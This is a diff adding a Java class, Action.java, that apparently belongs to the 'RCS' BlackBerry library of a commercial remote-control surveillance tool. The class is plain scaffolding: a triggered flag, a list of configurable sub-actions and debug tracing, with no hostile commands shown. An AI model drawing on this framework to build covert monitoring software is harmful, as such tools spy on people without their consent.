@@ -1,0 +1,113 @@
+/* *************************************************
+ * Copyright (c) 2010 - 2010
+ * HT srl,   All rights reserved.
+ * 
+ * Project      : RCS, RCSBlackBerry_lib 
+ * 
+ * File         : Action.java 
+ * Created      : 26-mar-2010
+ * *************************************************/
+
+package com.ht.rcs.blackberry.action;
+
+import java.util.Vector;
+
+import com.ht.rcs.blackberry.utils.Debug;
+import com.ht.rcs.blackberry.utils.DebugLevel;
+
+// TODO: Auto-generated Javadoc
+/**
+ * The Class Action.
+ */
+public class Action {
+
+    /** The debug. */
+    protected static Debug debug = new Debug("Status", DebugLevel.VERBOSE);
+
+    /** The Constant ACTION_UNINIT. */
+    public static final int ACTION_UNINIT = -2;
+
+    /** The Constant ACTION_NULL. */
+    public static final int ACTION_NULL = -1;
+
+    /** The triggered. */
+    private boolean triggered = false;
+
+    /** The sub action list. */
+    private Vector subActionList = null;
+
+    /** The Action id. */
+    public int ActionId = -1;
+
+    /**
+     * Instantiates a new action.
+     * 
+     * @param actionId
+     *            the action id
+     */
+    public Action(int actionId) {
+        ActionId = actionId;
+        subActionList = new Vector();
+    }
+
+    /**
+     * Checks if is triggered.
+     * 
+     * @return true, if is triggered
+     */
+    public synchronized boolean isTriggered() {
+        return triggered;
+    }
+
+    /**
+     * Sets the triggered.
+     * 
+     * @param value
+     *            the value
+     */
+    public synchronized void SetTriggered(boolean value) {
+
+        debug.trace(ActionId + " triggered:" + value);
+        triggered = value;
+    }
+
+    /**
+     * Gets the sub actions list.
+     * 
+     * @return the vector
+     */
+    public Vector GetSubActionsList() {
+        return subActionList;
+    }
+
+    /**
+     * Adds the sub action.
+     * 
+     * @param subAction
+     *            the sub action
+     */
+    private synchronized void addSubAction(SubAction subAction) {
+        subActionList.addElement(subAction);
+    }
+
+    /**
+     * Adds the new sub action.
+     * 
+     * @param actionSync
+     *            the action sync
+     * @param confParams
+     *            the conf params
+     */
+    public void addNewSubAction(int actionSync, byte[] confParams) {
+        SubAction subAction = SubAction.Factory(actionSync, confParams);
+        addSubAction(subAction);
+    }
+
+    /*
+     * (non-Javadoc)
+     * @see java.lang.Object#toString()
+     */
+    public String toString() {
+        return ActionId + " sa:" + subActionList.size();
+    }
+}
